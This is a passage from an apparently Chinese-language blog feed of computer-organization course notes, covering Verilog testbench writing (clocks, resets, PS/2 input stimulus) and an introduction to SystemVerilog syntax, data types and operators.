comment">// case 2: persist</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token comment">// case 3: next user</span>        user_reg <span class="token operator">&lt;=</span> priority_encoder_user_comb<span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    <span class="token comment">// default</span>    user_comb <span class="token operator">=</span> <span class="token number">2'b0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid_reg <span class="token operator">&amp;&amp;</span> valid<span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 1: non valid -&gt; valid</span>      user_comb <span class="token operator">=</span> priority_encoder_user_comb<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 2: persist</span>      user_comb <span class="token operator">=</span> user_reg<span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token comment">// case 3: next user</span>      user_comb <span class="token operator">=</span> priority_encoder_user_comb<span class="token punctuation">;</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h2><p><strong>描述数字电路的 Verilog 和用来仿真的 Verilog 使用完全不同的编写思路和实现方法.</strong> 前者与电路一一对应, 而后者更像是 C 这种过程式的编程语言.</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> add2 <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">assign</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要给这个模块输入数据, 要人为地设置模块的输入: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`timescale</span> <span class="token number">1</span>ns<span class="token operator">/</span><span class="token number">1</span>ps<span class="token keyword">module</span> add2_tb <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">;</span>  <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">;</span>  <span class="token keyword">initial</span> <span class="token keyword">begin</span>    a <span class="token operator">=</span> <span class="token number">2'b01</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">2'b10</span><span class="token punctuation">;</span>    <span class="token number">#1</span><span class="token punctuation">;</span>    <span class="token kernel-function property">$finish</span><span class="token punctuation">;</span>  <span class="token keyword">end</span>  add2 inst <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>c</code> 连接到 <code>add2</code> 模块的输出, 所以要用 <code>wire</code>; 其他要输入到 <code>add2</code> 模块中, 所以用 <code>reg</code>. 运行 <code>#1;</code> 命令, 表示等待 <code>1ns</code>, 然后再运行 <code>$finish;</code>, 表示仿真结束.</p><h3 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h3><p>仿真一个带有时序逻辑的模块, 使用前面的秒表的例子: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> timer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer_reg<span class="token punctuation">;</span>  <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      timer_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">20'd999999</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        timer_reg <span class="token operator">&lt;=</span> timer_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">20'b1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token keyword">assign</span> timer <span class="token operator">=</span> timer_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例化 <code>timer</code> 模块, 连接输入输出信号. 时钟信号以一个固定的频率在 0 和 1 之间变化. 如果频率是 50MHz, 那么一个周期每 10ns 变化一次. 这样下去就可以构造出一个时钟信号:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>希望仿真更多时钟周期, 自动生成时钟信号:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token important">always</span> <span class="token number">#10</span> clock <span class="token operator">=</span> <span class="token operator">~</span>clock<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复位"><a href="#复位" class="headerlink" title="复位"></a>复位</h3><p>处理好时钟后仿真上面的代码, 会发现 <code>timer</code> 输出一直是 <code>x</code>, 因为 <code>timer</code> 没有被复位. 需要先设置 <code>reset</code> 为 1, 再设置 <code>reset</code> 为 0: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">initial</span> <span class="token keyword">begin</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>  clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  reset <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>  <span class="token number">#10</span><span class="token punctuation">;</span>  reset <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token important">always</span> <span class="token number">#10</span> clock <span class="token operator">=</span> <span class="token operator">~</span>clock<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造输入"><a href="#构造输入" class="headerlink" title="构造输入"></a>构造输入</h3><p>目前的仿真顶层模块没有提供要测试的模块的其他输入信号, 还需要针对特定的协议人为构造输入.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">reg</span> ps2_clock<span class="token punctuation">;</span><span class="token keyword">reg</span> ps2_data<span class="token punctuation">;</span>ps2_keyboard dut <span class="token punctuation">(</span>  <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">ps2_clock</span><span class="token punctuation">(</span>ps2_clock<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">ps2_data</span><span class="token punctuation">(</span>ps2_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照 PS/2 的协议, 按顺序给 ps2_clock 和 ps2_data 赋值, 穿插着延迟语句.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span><span class="token comment">// start bit</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// scancode[0] = 0</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// scancode[1] = 0</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// scancode[7] = 1</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// parity = 1</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// stop</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更进一步, 如果想要重复发送 scancode, 只不过内容会更改, 可以把这一步骤封装成 task, 完整写法见 <a href="https://git.tsinghua.edu.cn/digital-design-lab/project-template/-/blob/2076e9ffc1ff3e923365a9e79d6a944544a3b8e8/src/keyboard_tb.v#L12">Tsinghua GitLab</a>.</p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>总结一下: </p><ul><li>单独写一个仿真顶层模块, 例化要测试的模块.</li><li>测试模块的输入输出接到 <code>reg</code> 或者 <code>wire</code>.</li><li>时序逻辑在 <code>initial</code> 块初始化时钟信号, 用 <code>always #10 clock = ~clock;</code> 生成时钟信号.</li><li>复位信号在 <code>initial</code> 块内, 仿真信号由 0 变成 1, 再由 1 变成 0.</li><li>输入信号在 <code>initial</code> 块内, 对对应的 <code>reg</code> 信号进行赋值.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记3</title>
      <link href="/2023/09/28/ji-suan-ji-zu-cheng-yuan-li-bi-ji-3/"/>
      <url>/2023/09/28/ji-suan-ji-zu-cheng-yuan-li-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="System-Verilog-入门使用"><a href="#System-Verilog-入门使用" class="headerlink" title="System Verilog 入门使用"></a>System Verilog 入门使用</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>写硬件和写软件代码是完全不同的——软件代码体现了指令顺序流执行的思想, 这是和冯诺依曼计算机的结构直接相关的; 硬件的特性是信号在各条信号线上并行传播, 硬件描述语言描述的是各个模块之间的连接关系. </p><h2 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h2><p>一个 2 输入与门的模块描述: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> and2x <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token keyword">wire</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token keyword">wire</span> b<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">wire</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">assign</span> r <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的几点是:</p><ul><li>输入和双向端口不能被定义为 <code>reg</code> 类型. </li><li>如果无法确认使用 <code>reg</code> 还是使用 <code>wire</code>, 都可以使用 <code>logic</code> 来代替. </li><li><code>wire</code> 是默认的类型, 所有的 <code>wire</code> 都可以省略. </li><li>通过 <code>assign</code> 语句进行持续赋值, 通常被用来进行组合逻辑的设计.</li></ul><h2 id="语言元素"><a href="#语言元素" class="headerlink" title="语言元素"></a>语言元素</h2><p>硬件描述里面的 “综合” 这个概念非常重要, 类比于将高级语言编译为机器语言, 最终在物理硬件上执行. “综合” 的含义就是将硬件描述语言的功能翻译为能够直接实现的电路, 可以放到 FPGA 或者直接转化为硬件电路, 用以执行所描述的功能. </p><h3 id="SystemVerilog-的语言元素"><a href="#SystemVerilog-的语言元素" class="headerlink" title="SystemVerilog 的语言元素"></a>SystemVerilog 的语言元素</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>在 C 语言中, 一个编程习惯是使用符号来代替常数硬编码. 这一点在 SystemVerilog 中也是一样的. 可以使用 <code>parameter</code> 来定义一个符号常量, 便于修改也增加了程序的可读性. 一个最为典型的应用就是来指定信号 (向量) 的宽度, 使用 parameter 的语法形式为: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">parameter</span> PARAM1<span class="token operator">=</span>EXP1<span class="token punctuation">,</span> PARAM2<span class="token operator">=</span>EXP2<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="编译指导语句"><a href="#编译指导语句" class="headerlink" title="编译指导语句"></a>编译指导语句</h4><p>SystemVerilog 中的编译指导语句与 C 语言 (例如 <code>#include</code>) 类似, 指示编译器的工作. 编译指导语句都是不可综合的, 会在编译的时候进行字符串等替换操作. </p><h5 id="define-宏定义语句"><a href="#define-宏定义语句" class="headerlink" title="`define 宏定义语句"></a><code>`define</code> 宏定义语句</h5><p><code>`define</code> 语句相当于 C 语言中的 <code>#define</code>, 在编译时, <code>`define</code> 的宏名称被替换为后面的字符串. 如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> WIDTH <span class="token number">16</span><span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token constant">`WIDTH</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> r<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这就与 <code>reg[15:0]</code> 相当. 在每次使用宏名称的时候, 需要加上 <code>` </code>, 在 <code>`define</code> 这一行的行末不需要分号.  <code>`define</code> 的宏替换功能与 C 语言一样强大, 能够用来替换比较复杂的表达式. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> sum a<span class="token operator">+</span>b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定义之后, 可以使用: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">assign</span> res<span class="token operator">=</span>sum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来获得将两个 a 和 b 信号相加的效果.</p><h5 id="include-文件包含语句"><a href="#include-文件包含语句" class="headerlink" title="`include 文件包含语句"></a><code>`include</code> 文件包含语句</h5><p><code>`include</code> 语句相当于 C 语言中的 <code>#include</code> 语句, 用来包含其它的文件. 这里同样也没有行末的分号, 需要设置对应的相对路径, 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`include</span> <span class="token string">"../common/adder.v"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ifdef-else-elsif-endif-条件编译语句"><a href="#ifdef-else-elsif-endif-条件编译语句" class="headerlink" title="`ifdef,  `else, `elsif, `endif 条件编译语句"></a><code>`ifdef</code>,  <code>`else</code>, <code>`elsif</code>, <code>`endif</code> 条件编译语句</h5><p><code>`ifdef</code>, <code>`else</code>, <code>`elsif</code>, <code>`endif</code> 条件编译语句相当于在 C 语言中的 <code>#ifdef</code>, <code>#else</code>, <code>#elif</code>, <code>#endif</code> 语句, 用来设定哪一部分源代码会最终编译, 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> sum a<span class="token operator">+</span>b<span class="token constant">`ifdef</span> sum<span class="token keyword">assign</span> res<span class="token operator">=</span>sum<span class="token punctuation">;</span><span class="token constant">`else</span><span class="token keyword">assign</span> res<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token constant">`endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过控制 <code>sum</code> 是否定义来选择需要编译的源代码, 不需要编译的源代码就被忽略. 需要嵌套更多判断, 可以使用 <code>`elsif</code> 进一步判断. </p><h3 id="SystemVerilog-中的数据"><a href="#SystemVerilog-中的数据" class="headerlink" title="SystemVerilog 中的数据"></a>SystemVerilog 中的数据</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><p>在硬件开发的过程中, 不能够改变的量被称为是常量 (constants). 在处理器设计中, 最为重要的常量形式为整数, 整数常量按照一定的格式写出: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token operator">+/-</span> <span class="token operator">&lt;</span>位宽<span class="token operator">&gt;</span>'<span class="token operator">&lt;</span>进制<span class="token operator">&gt;&lt;</span>数字<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进制包括了二进制 (<code>b</code> 或者 <code>B</code>), 十进制 (<code>d</code> 或者 <code>D</code>), 八进制 (<code>o</code> 或者 <code>O</code>) 以及十六进制 (<code>h</code> 或者 <code>H</code>).</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token number">8'b01001010</span><span class="token number">16'H45EF</span><span class="token operator">-</span><span class="token number">8'D123</span><span class="token operator">-</span><span class="token number">16'o3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据取值"><a href="#数据取值" class="headerlink" title="数据取值"></a>数据取值</h4><p>在进行硬件编码的时候, 除了 <code>0</code> 和 <code>1</code> 两个信号取值外, 还有其它的一些逻辑状态. 两个比较重要的是 <code>x</code>/<code>X</code> 和 <code>z</code>/<code>Z</code>.</p><p><code>x</code> 或者 <code>X</code> 的取值表明为不确定, 或者未知逻辑状态, 用于不关心对应信号值的情况.</p><p><code>z</code> 或者 <code>Z</code> 代表高阻态, 典型应用是用于获得内存的输入, 先将处理器引脚的状态置于 <code>z</code>, 经过一定的时间延迟, 可从对应的引脚处获得内存的输入值. </p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>基本数据类型包括了 <code>wire</code> 类型和 <code>reg</code> 类型. <code>wire</code> 类型代表了在硬件电路中的连线, 输出的值紧随着输入值的变化而变化. <code>reg</code> 数据类型会放到过程语句中进行赋值, 不一定必然会对应到硬件的寄存器, 综合时依据实际情况使用连线 (组合逻辑) 或者寄存器 (时序逻辑). </p><p>数据类型还有向量和标量的区别. 没有指定则默认为 1 位的位宽, 是一个标量. 向量使用中括号指定位宽, 形式为 <code>[msb:lsb]</code>. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> data<span class="token punctuation">;</span> <span class="token comment">// 这是一个 8 位的连线. </span><span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> res<span class="token punctuation">;</span>  <span class="token comment">// 32 位的数据变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 SystemVerilog 中有非常方便的向量访问方式:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">l <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 获取 data 的最高位</span>lob <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取数据 res 中的最低 8 位, 即最低一个字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SystemVerilog-中的运算"><a href="#SystemVerilog-中的运算" class="headerlink" title="SystemVerilog 中的运算"></a>SystemVerilog 中的运算</h3><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p>位运算符是最基本的运算符, 表达了两个操作数对应的位进行位运算的结果.</p><ul><li><code>~</code> 按位取反.</li><li><code>&amp;</code> 按位与.</li><li><code>|</code> 按位或. </li><li><code>^</code> 按位异或.</li><li><code>^~</code> 或 <code>~^</code> 按位同或.</li><li><code>&gt;&gt;</code> 右移.</li><li><code>&lt;&lt;</code> 左移.</li></ul><p>在位运算符中还有一类特殊的运算符, 即缩位运算符. 可以将一个向量按照一定的位运算 “缩” 成 1 位. </p><ul><li><code>&amp;</code> 缩位与.</li><li><code>~&amp;</code> 缩位与非.</li><li><code>|</code> 缩位或.</li><li><code>~\</code> 缩位或非.</li><li><code>^</code> 缩位异或.</li><li><code>^~</code> 或 <code>~^</code> 缩位同或.</li></ul><p>例如 <code>reg [7:0] value;</code> 如果 <code>value = 7'b01010101</code>. 则 <code>&amp;value</code> 结果为 0, <code>|value</code> 结果为 1, <code>~^value</code> 结果为 1.</p><h4 id="关系和逻辑运算符"><a href="#关系和逻辑运算符" class="headerlink" title="关系和逻辑运算符"></a>关系和逻辑运算符</h4><p>这些运算符可用于条件判断, 取值结果为 <code>true</code> 或者 <code>false</code>. 着重解释一下全等运算符和不全等运算符.</p><ul><li><code>===</code> 关系运算符全等. </li><li><code>!==</code> 关系运算符不全等. </li></ul><p>相等运算符 <code>==</code> 在进行比较时, 需要按每位进行比较, 只有所有的位都相等的时候, 最后的结果值才会是 <code>true</code>. 如果其中的某一位是高阻态或者不定值, 最终的结果是不定值. 对于全等 <code>===</code> 来说, 这些高阻态或者不定值也需要进行比较, 完全一致才会获得 <code>true</code> 结果.  </p><div class="table-container"><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">A==B</th><th style="text-align:center">A===B</th></tr></thead><tbody><tr><td style="text-align:center">4b1101</td><td 